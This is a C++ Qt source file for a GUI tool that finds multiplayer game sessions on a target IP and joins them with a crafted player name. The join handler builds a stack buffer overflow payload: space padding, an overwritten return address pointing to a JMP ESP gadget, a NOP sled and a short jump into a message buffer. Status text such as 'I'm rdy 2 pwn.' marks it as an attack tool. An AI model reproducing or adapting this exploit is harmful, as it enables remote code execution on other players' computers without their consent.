#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "ui_frm_chat.h"
#include "frm_chat.h"
#include <QDesktopWidget>
#include <QStringList>
#include <QStringListModel>
#include <windows.h>
#include "structures.h"
#include "globals.hpp"
//////////////////////////////////////////////////////////////////////////////
#define MAX_SESSIONS 10 // ultima = null

char jmp_to_msgbuffer[] = "\xEB\x02";

HMODULE hAoClib;
HMODULE hWinmm;
// aoclib
GetSessionsFromIp pGetSessionsFromIp;
OpenSession pOpenSession;
RecvMsg pRecvMsg;
SendMsg pSendMsg;
CloseSession pCloseSession;
GetPlayerName pGetPlayerName;
// winmm
winmmtimeGetTime ptimeGetTime;

DWORD DPID;

_MP_SESSION_INFORMATION * sessions = new _MP_SESSION_INFORMATION[MAX_SESSIONS];

QStringListModel model;
QListView *LvGames;
QLabel *lbStatusMsg;
QLineEdit *txtName, *txtIp;
frm_chat *chat;
//////////////////////////////////////////////////////////////////////////////
MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    hAoClib = LoadLibraryA("aoclib.dll");
    pGetSessionsFromIp = (GetSessionsFromIp)GetProcAddress(hAoClib,"GetSessionsFromIp");
    pOpenSession = (OpenSession)GetProcAddress(hAoClib,"OpenSession");
    pCloseSession = (CloseSession)GetProcAddress(hAoClib,"CloseSession");
    pRecvMsg = (RecvMsg)GetProcAddress(hAoClib,"RecvMsg");
    pSendMsg = (SendMsg)GetProcAddress(hAoClib,"SendMsg");
    pGetPlayerName = (GetPlayerName)GetProcAddress(hAoClib,"GetPlayerName");

    hWinmm = LoadLibraryA("winmm.dll");
    ptimeGetTime = (winmmtimeGetTime)GetProcAddress(hWinmm,"timeGetTime");

    ZeroMemory(sessions,sizeof _MP_SESSION_INFORMATION*MAX_SESSIONS);

    ui->setupUi(this);

    LvGames = ui->LvGames;
    lbStatusMsg = ui->lbStatusMsg;
    txtName = ui->txtName;
    txtIp = ui->txtIp;

    const QRect screen = QApplication::desktop()->screenGeometry();
    this->move( screen.center() - this->rect().center() );

    ui->LvGames->setModel(&model);
    ui->txtName->setFocus(Qt::OtherFocusReason);
}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::on_bGames_clicked()
{
    int i;

    if(LvGames->model())
        LvGames->model()->removeRows(0, LvGames->model()->rowCount(LvGames->rootIndex()),LvGames->rootIndex());

    lbStatusMsg->setText("<font color='gray'>Connecting...</font>");
    repaint();

    i = 0;
    while(sessions[i].lpszSessionNameA){
        GlobalFree(sessions[i].lpszSessionNameA);
        i++;
    }

    ZeroMemory(sessions,sizeof _MP_SESSION_INFORMATION*MAX_SESSIONS);

    if(pGetSessionsFromIp((char*)txtIp->text().toStdString().c_str(),&sessions,MAX_SESSIONS-2)==ERROR_SUCCESS){

        i = 0;
        while(sessions[i].lpszSessionNameA){
            LvGames->model()->insertRow(i);
            LvGames->model()->setData(LvGames->model()->index(i,0),sessions[i].lpszSessionNameA);
            i++;
        }
        if(i){
            LvGames->setCurrentIndex(LvGames->model()->index(0,0,QModelIndex()));
            lbStatusMsg->setText("I'm rdy 2 pwn.");
        } else
            lbStatusMsg->setText("<font color='red'>No sessions found.</font>");

    } else {
        lbStatusMsg->setText("<font color='red'>Target not found.</font>");
    }
}

void MainWindow::on_bJoin_clicked()
{
    RETNADDR *lpReturnAddress;
    QModelIndex index;    
    int i = 0, cbPlayerNameLength;
    char *lpszPlayerName;

    while(index<LvGames->currentIndex()){
        index = LvGames->model()->index(i,0,LvGames->rootIndex());
        i++;
    }

    if(i){
        i--;
        lbStatusMsg->setText("<font color='gray'>Joining...</font>");
        repaint();

        lpszPlayerName = (char*)GlobalAlloc(GPTR,1115);

        cbPlayerNameLength = txtName->text().length();
        memmove(lpszPlayerName,txtName->text().toStdString().c_str(),cbPlayerNameLength);
        while(cbPlayerNameLength<509){ //509 (nick+padding)
            lpszPlayerName[cbPlayerNameLength] = '\x20';
            cbPlayerNameLength++;
        }

        lpReturnAddress = (RETNADDR*)&lpszPlayerName[cbPlayerNameLength];
        lpReturnAddress->lpReturnAddress = JMP_ESP;
        cbPlayerNameLength += 4;

        while(cbPlayerNameLength<1112){ //593 (padding+extra[w7])
            lpszPlayerName[cbPlayerNameLength] = '\x90';
            cbPlayerNameLength++;
        }

        memmove(&lpszPlayerName[cbPlayerNameLength],jmp_to_msgbuffer,2);

        if(pOpenSession(&sessions[i].guidInstance,lpszPlayerName,&DPID)==ERROR_SUCCESS) {
            chat = new frm_chat;
            connect(this,SIGNAL(initializeChat()),chat,SLOT(onInitialize()));
            connect(chat,SIGNAL(ShowMainForm()),this,SLOT(ShowMainForm()));
            connect(chat,SIGNAL(HideMainForm()),this,SLOT(HideMainForm()));
            if(!chat->isVisible()){
                ui->txtIp->setDisabled(TRUE);
                ui->txtName->setDisabled(TRUE);
                ui->bGames->setDisabled(TRUE);
                ui->bJoin->setDisabled(TRUE);
                initializeChat();
            }
        } else {
            lbStatusMsg->setText("<font color='red'>Can't open session.</font>");
        }
        GlobalFree(lpszPlayerName);
    } else {
        lbStatusMsg->setText("<font color='gray'>No session selected.</font>");
    }
}

void MainWindow::ShowMainForm()
{
    delete chat;
    ui->txtIp->setDisabled(FALSE);
    ui->txtName->setDisabled(FALSE);
    ui->bGames->setDisabled(FALSE);
    ui->bJoin->setDisabled(FALSE);

    if(LvGames->model())
        LvGames->model()->removeRows(0, LvGames->model()->rowCount(LvGames->rootIndex()),LvGames->rootIndex());

    lbStatusMsg->setText("Application loaded. hihihi!");
    this->show();
}

void MainWindow::HideMainForm()
{
    this->hide();
}
